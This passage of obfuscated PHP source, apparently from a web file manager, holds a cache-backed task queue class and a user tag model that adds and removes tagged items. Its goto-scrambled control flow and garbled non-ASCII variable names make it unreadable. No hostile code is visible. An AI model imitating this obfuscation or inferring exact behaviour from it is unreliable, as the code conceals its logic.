self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Aç¬®»Å´â && array_find_by_field(self::$listData, $dãƒœ³íì†[92], $Aç¬®»Å´â)) { return !0; } self::$listData[] = array($dãƒœ³íì†[260] => $a÷Ó¨ˆ­Î», $dãƒœ³íì†[1580] => $B®Œ¸ŠÙîª, $dãƒœ³íì†[425] => $a´‡…Şõçê, $dãƒœ³íì†[92] => $Aç¬®»Å´â); return !0; } public static function addSubmit() { $EœÛ”˜ñ™ =& $_SERVER[ÉóçÄÇ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($EœÛ”˜ñ™[1581] . json_encode_force(array_to_keyvalue(self::$listData, $EœÛ”˜ñ™[33], $EœÛ”˜ñ™[425])), $EœÛ”˜ñ™[1582]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($F†­å½÷§†, $eéöÆÉÇÊÈ = array(), $Eˆ¶¬ÛÀªà = '', $EŞ¢Ğèíæí = '') { goto e–êóñ±Ï; Cßï”ÉÔ“: self::setAll($A£ºŒê„¾æ); return !0; goto bøØŠâğêÚ; aÍÎæ»ğÜá: if ($EŞ¢Ğèíæí && array_find_by_field($A£ºŒê„¾æ, $F‹ºƒ§˜ãè[92], $EŞ¢Ğèíæí)) { return !0; } $A£ºŒê„¾æ[] = array($F‹ºƒ§˜ãè[260] => $F†­å½÷§†, $F‹ºƒ§˜ãè[1580] => $eéöÆÉÇÊÈ, $F‹ºƒ§˜ãè[425] => $Eˆ¶¬ÛÀªà, $F‹ºƒ§˜ãè[92] => $EŞ¢Ğèíæí); write_log($F‹ºƒ§˜ãè[1581] . $Eˆ¶¬ÛÀªà, $F‹ºƒ§˜ãè[1582]); goto Cßï”ÉÔ“; e–êóñ±Ï: $F‹ºƒ§˜ãè =& $_SERVER[ÉóçÄÇ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $A£ºŒê„¾æ = self::getAll(); goto aÍÎæ»ğÜá; bøØŠâğêÚ: } public static function run() { goto A¯Ã’¬Ú¯Å; fŒ¸¡ÚÈ‚ß: if (!$eÒâË†áÚ) { return !1; } self::setAll($fÏõÚó½Ø¨); $dŒŠøŸÈì¿ = timeFloat(); goto c«¼Ö ÙÀö; A¯Ã’¬Ú¯Å: $F«‹åëß¡ =& $_SERVER[ÉóçÄÇ]; $fÏõÚó½Ø¨ = self::getAll(); $eÒâË†áÚ = array_shift($fÏõÚó½Ø¨); goto fŒ¸¡ÚÈ‚ß; c«¼Ö ÙÀö: try { Hook::apply($eÒâË†áÚ[$F«‹åëß¡[260]], $eÒâË†áÚ[$F«‹åëß¡[1580]]); } catch (Exception $a‰Çéî¦â) { } $bÙÜº¾¦ª… = number_format(timeFloat() - $dŒŠøŸÈì¿, 3) . $F«‹åëß¡[1524]; write_log($F«‹åëß¡[1583] . $eÒâË†áÚ[$F«‹åëß¡[425]] . $F«‹åëß¡[1584] . $bÙÜº¾¦ª…, $F«‹åëß¡[1582]); goto cÎÄà›äÇä; cÎÄà›äÇä: return !0; goto C‰˜âºµŸÌ; C‰˜âºµŸÌ: } public static function count() { $CÄÏ…¥ŒÏä = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$CÄÏ…¥ŒÏä) { return 0; } return intval($CÄÏ…¥ŒÏä); } public static function getAll() { $D«ÙĞÃËí§ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$D«ÙĞÃËí§) { return array(); } return $D«ÙĞÃËí§; } public static function setAll($bˆÓ‚’éÆÍ) { $Dæ£¡­¤ì = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($bˆÓ‚’éÆÍ), $Dæ£¡­¤ì); Cache::set(self::QUEUE_DATA, $bˆÓ‚’éÆÍ, $Dæ£¡­¤ì); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto DÉÇß˜ÌŸ›; aÍŠ¦«’Æİ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($d©¬ÙÅš˜Õ) { $FšèË”†‹İ =& $_SERVER[ÉóçÄÇ]; return array($FšèË”†‹İ[1777] => array(USER_ID, $FšèË”†‹İ[1778])); } protected function listData() { $Aõ‚Ôá¤ßƒ =& $_SERVER[ÉóçÄÇ]; $B½ôÄ‹ìˆ = array($Aõ‚Ôá¤ßƒ[1503] => USER_ID, $Aõ‚Ôá¤ßƒ[457] => array($Aõ‚Ôá¤ßƒ[1781], 0)); $cø¿ã³êµĞ = $Aõ‚Ôá¤ßƒ[1783]; $B±÷¬ö¹†È = $this->field($cø¿ã³êµĞ)->where($B½ôÄ‹ìˆ)->order($Aõ‚Ôá¤ßƒ[1784])->select(); return $B±÷¬ö¹†È ? $B±÷¬ö¹†È : array(); } protected function listByTag($aéœ¼“Ëá) { } protected function addToTag($AĞ—æ’ğùá, $E ñƒÙ‘ãÓ) { $EãÁù´‹”Š =& $_SERVER[ÉóçÄÇ]; if (!Model($EãÁù´‹”Š[1918])->listData($E ñƒÙ‘ãÓ) || !Model($EãÁù´‹”Š[776])->pathInfo($AĞ—æ’ğùá)) { return !1; } $eìÖš”Õ¾ = array($EãÁù´‹”Š[1503] => USER_ID, $EãÁù´‹”Š[457] => $E ñƒÙ‘ãÓ, $EãÁù´‹”Š[408] => $AĞ—æ’ğùá, $EãÁù´‹”Š[409] => $EãÁù´‹”Š[403], $EãÁù´‹”Š[407] => $EãÁù´‹”Š[33], $EãÁù´‹”Š[1678] => 0); if ($this->where($eìÖš”Õ¾)->find()) { return !1; } return $this->add($eìÖš”Õ¾); } protected function removeFromTag($AÜÉßñ, $fĞè—ğĞ½–) { $C’±¸â¡°œ =& $_SERVER[ÉóçÄÇ]; if (!Model($C’±¸â¡°œ[1918])->listData($fĞè—ğĞ½–)) { return !1; } if (is_array($AÜÉßñ)) { $AÜÉßñ = array($C’±¸â¡°œ[7], $AÜÉßñ); } $C¡ó”‹Êßƒ = array($C’±¸â¡°œ[1503] => USER_ID, $C’±¸â¡°œ[457] => $fĞè—ğĞ½–, $C’±¸â¡°œ[409] => $C’±¸â¡°œ[403], $C’±¸â¡°œ[408] => $AÜÉßñ); return $this->where($C¡ó”‹Êßƒ)->delete(); } protected function removeByTag($Fæ™Ğå¸ê´) { $cØä•ô Í =& $_SERVER[ÉóçÄÇ]; if (!$Fæ™Ğå¸ê´) { return !1; } $B¬«à•¯¢– = array($cØä•ô Í[1503] => USER_ID, $cØä•ô Í[457] => $Fæ™Ğå¸ê´); return $this->where($B¬«à•¯¢–)->delete(); } protected function removeBySource($eô—ò¯í‘“) { $a‰‹´¸èÓ‹ =& $_SERVER[ÉóçÄÇ]; if (is_array($eô—ò¯í‘“)) { $eô—ò¯í‘“ = array($a‰‹´¸èÓ‹[7], $eô—ò¯í‘“); } $cˆåˆƒ¼´Ÿ = array($a‰‹´¸èÓ‹[1503] => USER_ID, $a‰‹´¸èÓ‹[408] => $eô—ò¯í‘“, $a‰‹´¸èÓ‹[457] => array($a‰‹´¸èÓ‹[953], 0)); return $this->where($cˆåˆƒ¼´Ÿ)->delete(); } }